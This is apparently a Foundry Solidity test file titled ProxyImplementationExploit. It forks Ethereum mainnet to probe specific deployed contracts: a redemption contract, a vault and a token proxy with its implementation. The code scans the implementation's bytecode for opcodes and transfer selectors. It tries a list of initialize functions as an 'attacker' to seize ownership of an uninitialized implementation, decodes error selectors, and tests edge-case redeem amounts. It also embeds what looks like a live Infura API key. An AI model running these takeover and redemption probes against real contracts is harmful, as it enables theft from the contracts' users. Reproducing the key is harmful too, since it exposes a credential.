// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
}

contract ProxyImplementationExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    
    // The proxy found in Redemption storage
    address constant TASSET_PROXY = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant TASSET_IMPL = 0xD1A622566F277AA76c3C47A30469432AAec95E38;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeTAssetProxy() public view {
        console.log("=== ANALYZING TASSET PROXY ===\n");

        console.log("Proxy address:", TASSET_PROXY);
        console.log("Implementation:", TASSET_IMPL);

        // Check if it's an ERC20
        (bool success, bytes memory data) = TASSET_PROXY.staticcall(
            abi.encodeWithSignature("name()")
        );
        if (success && data.length > 0) {
            string memory name = abi.decode(data, (string));
            console.log("Name:", name);
        }

        (success, data) = TASSET_PROXY.staticcall(
            abi.encodeWithSignature("symbol()")
        );
        if (success && data.length > 0) {
            string memory symbol = abi.decode(data, (string));
            console.log("Symbol:", symbol);
        }

        (success, data) = TASSET_PROXY.staticcall(
            abi.encodeWithSignature("totalSupply()")
        );
        if (success && data.length == 32) {
            uint256 supply = abi.decode(data, (uint256));
            console.log("Total supply:", supply / 1e18);
        }

        // Check balance of Vault
        (success, data) = TASSET_PROXY.staticcall(
            abi.encodeWithSignature("balanceOf(address)", VAULT)
        );
        if (success && data.length == 32) {
            uint256 bal = abi.decode(data, (uint256));
            console.log("Vault balance:", bal / 1e18);
        }
    }

    function test_AnalyzeTAssetImplementation() public view {
        console.log("=== ANALYZING TASSET IMPLEMENTATION ===\n");

        console.log("Implementation:", TASSET_IMPL);
        console.log("Code size:", TASSET_IMPL.code.length);

        bytes memory code = TASSET_IMPL.code;

        // Count opcodes
        uint256 delegatecallCount = 0;
        uint256 callCount = 0;
        uint256 staticcallCount = 0;
        uint256 selfdestuctCount = 0;

        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) delegatecallCount++;
            if (uint8(code[i]) == 0xf1) callCount++;
            if (uint8(code[i]) == 0xfa) staticcallCount++;
            if (uint8(code[i]) == 0xff) selfdestuctCount++;
        }

        console.log("DELEGATECALL:", delegatecallCount);
        console.log("CALL:", callCount);
        console.log("STATICCALL:", staticcallCount);
        console.log("SELFDESTRUCT:", selfdestuctCount);

        // Check for transfer selectors
        bytes4 transferSel = bytes4(0xa9059cbb);
        bytes4 transferFromSel = bytes4(0x23b872dd);

        for (uint i = 0; i + 3 < code.length; i++) {
            bytes4 sel = bytes4(bytes.concat(code[i], code[i+1], code[i+2], code[i+3]));
            if (sel == transferSel) {
                console.log("Has transfer at:", i);
            }
            if (sel == transferFromSel) {
                console.log("Has transferFrom at:", i);
            }
        }
    }

    function test_CheckImplementationStorage() public view {
        console.log("=== CHECKING IMPLEMENTATION STORAGE ===\n");

        // Check if implementation has uninitialized state
        console.log("Implementation storage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(TASSET_IMPL, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }

        // Check initializable slot (common pattern for UUPS/TransparentProxy)
        // Slot 0 often stores initialized flag
        bytes32 slot0 = vm.load(TASSET_IMPL, bytes32(uint256(0)));
        console.log("\nSlot 0 (initialized?):");
        console.logBytes32(slot0);

        // For UUPS, check if implementation is initialized
        // If not, we might be able to initialize it and take ownership!
    }

    function test_TryToInitializeImplementation() public {
        console.log("=== TRYING TO INITIALIZE IMPLEMENTATION ===\n");

        vm.startPrank(attacker);

        // Common initialize functions
        bytes4[] memory initSelectors = new bytes4[](10);
        initSelectors[0] = bytes4(keccak256("initialize()"));
        initSelectors[1] = bytes4(keccak256("initialize(address)"));
        initSelectors[2] = bytes4(keccak256("__ERC20_init(string,string)"));
        initSelectors[3] = bytes4(keccak256("init()"));
        initSelectors[4] = bytes4(keccak256("init(address)"));
        initSelectors[5] = bytes4(keccak256("setUp()"));
        initSelectors[6] = bytes4(keccak256("setup()"));
        initSelectors[7] = bytes4(keccak256("initialize(string,string)"));
        initSelectors[8] = bytes4(keccak256("initialize(address,address)"));
        initSelectors[9] = bytes4(keccak256("__Ownable_init()"));

        console.log("Trying to call initialize functions on implementation...");

        for (uint i = 0; i < initSelectors.length; i++) {
            bytes memory callData;
            if (i == 1 || i == 4) {
                callData = abi.encodeWithSelector(initSelectors[i], attacker);
            } else if (i == 2 || i == 7) {
                callData = abi.encodeWithSelector(initSelectors[i], "Test", "TST");
            } else if (i == 8) {
                callData = abi.encodeWithSelector(initSelectors[i], attacker, attacker);
            } else {
                callData = abi.encodeWithSelector(initSelectors[i]);
            }

            (bool initSuccess, ) = TASSET_IMPL.call(callData);
            if (initSuccess) {
                console.log("SUCCESS! Selector:");
                console.logBytes4(initSelectors[i]);
            }
        }

        // Check if we became owner
        (bool success, bytes memory data) = TASSET_IMPL.staticcall(
            abi.encodeWithSignature("owner()")
        );
        if (success && data.length == 32) {
            address owner = abi.decode(data, (address));
            console.log("\nImplementation owner after init attempts:", owner);
            if (owner == attacker) {
                console.log("*** WE OWN THE IMPLEMENTATION! ***");
            }
        }

        vm.stopPrank();
    }

    function test_DecodeCustomError() public pure {
        console.log("=== DECODING CUSTOM ERROR 0xa0927dc3 ===\n");

        // Try more error patterns
        bytes4 err1 = bytes4(keccak256("ZeroAmount()"));
        bytes4 err2 = bytes4(keccak256("AmountTooLow()"));
        bytes4 err3 = bytes4(keccak256("MinAmountNotMet()"));
        bytes4 err4 = bytes4(keccak256("InsufficientAmount()"));
        bytes4 err5 = bytes4(keccak256("BelowMinimum()"));
        bytes4 err6 = bytes4(keccak256("TooLow()"));
        bytes4 err7 = bytes4(keccak256("RedemptionDisabled()"));
        bytes4 err8 = bytes4(keccak256("RedemptionsPaused()"));
        bytes4 err9 = bytes4(keccak256("RedemptionsClosed()"));
        bytes4 err10 = bytes4(keccak256("NotOpen()"));

        console.log("ZeroAmount():");
        console.logBytes4(err1);
        console.log("AmountTooLow():");
        console.logBytes4(err2);
        console.log("MinAmountNotMet():");
        console.logBytes4(err3);
        console.log("InsufficientAmount():");
        console.logBytes4(err4);
        console.log("BelowMinimum():");
        console.logBytes4(err5);
        console.log("TooLow():");
        console.logBytes4(err6);
        console.log("RedemptionDisabled():");
        console.logBytes4(err7);
        console.log("RedemptionsPaused():");
        console.logBytes4(err8);
        console.log("RedemptionsClosed():");
        console.logBytes4(err9);
        console.log("NotOpen():");
        console.logBytes4(err10);

        // Target is 0xa0927dc3
        console.log("\nTarget: 0xa0927dc3");

        // More guesses
        bytes4 err11 = bytes4(keccak256("InsufficientBalance()"));
        bytes4 err12 = bytes4(keccak256("InvalidAmount()"));
        bytes4 err13 = bytes4(keccak256("ExceedsMaximum()"));
        bytes4 err14 = bytes4(keccak256("CapExceeded()"));
        bytes4 err15 = bytes4(keccak256("MaxRedemptionExceeded()"));

        console.log("\nInsufficientBalance():");
        console.logBytes4(err11);
        console.log("InvalidAmount():");
        console.logBytes4(err12);
        console.log("ExceedsMaximum():");
        console.logBytes4(err13);
        console.log("CapExceeded():");
        console.logBytes4(err14);
        console.log("MaxRedemptionExceeded():");
        console.logBytes4(err15);
    }

    function test_CheckRedemptionState() public view {
        console.log("=== CHECKING REDEMPTION STATE ===\n");

        // Check if redemption is actually open

        // Try isPaused
        (bool success, bytes memory data) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("paused()")
        );
        if (success && data.length == 32) {
            bool paused = abi.decode(data, (bool));
            console.log("paused():", paused);
        }

        // Try isOpen
        (success, data) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("isOpen()")
        );
        if (success && data.length == 32) {
            bool open = abi.decode(data, (bool));
            console.log("isOpen():", open);
        }

        // Try redemptionEnabled
        (success, data) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("redemptionEnabled()")
        );
        if (success && data.length == 32) {
            bool enabled = abi.decode(data, (bool));
            console.log("redemptionEnabled():", enabled);
        }

        // Try maxRedemptionAmount
        (success, data) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("maxRedemptionAmount()")
        );
        if (success && data.length == 32) {
            uint256 max = abi.decode(data, (uint256));
            console.log("maxRedemptionAmount():", max / 1e18);
        }

        // Try minRedemptionAmount
        (success, data) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("minRedemptionAmount()")
        );
        if (success && data.length == 32) {
            uint256 min = abi.decode(data, (uint256));
            console.log("minRedemptionAmount():", min / 1e18);
        }

        // Check the unknown selectors that returned data
        // 0x1650cf97 returned 200e18 - might be something like maxPerTx
        console.log("\nUnknown selectors:");
        
        (success, data) = REDEMPTION_0.staticcall(
            abi.encodeWithSelector(bytes4(0x1650cf97))
        );
        if (success && data.length == 32) {
            console.log("0x1650cf97:", abi.decode(data, (uint256)) / 1e18);
        }

        // 0x3f14c193 - could be totalRedeemed
        (success, data) = REDEMPTION_0.staticcall(
            abi.encodeWithSelector(bytes4(0x3f14c193))
        );
        if (success && data.length == 32) {
            console.log("0x3f14c193:", abi.decode(data, (uint256)) / 1e18);
        }

        // 0x3a2ef9df - returned 604032
        (success, data) = REDEMPTION_0.staticcall(
            abi.encodeWithSelector(bytes4(0x3a2ef9df))
        );
        if (success && data.length == 32) {
            console.log("0x3a2ef9df:", abi.decode(data, (uint256)));
        }
    }

    function test_TryDifferentAmounts() public {
        console.log("=== TRYING DIFFERENT REDEEM AMOUNTS ===\n");

        deal(IAU, attacker, 10000e18);

        vm.startPrank(attacker);

        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);

        // Try very small amount
        console.log("1. Trying 1 wei...");
        (bool success, bytes memory data) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(1))
        );
        console.log("   Success:", success);
        if (!success) {
            console.log("   Error:");
            console.logBytes4(bytes4(data));
        }

        // Try 200 ETH (the value from 0x1650cf97)
        console.log("\n2. Trying 200e18...");
        (success, data) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(200e18))
        );
        console.log("   Success:", success);
        if (!success) {
            console.log("   Error:");
            console.logBytes4(bytes4(data));
        }

        // Try max uint96
        console.log("\n3. Trying max uint96...");
        (success, data) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", type(uint96).max)
        );
        console.log("   Success:", success);
        if (!success) {
            console.log("   Error:");
            console.logBytes4(bytes4(data));
        }

        vm.stopPrank();
    }
}
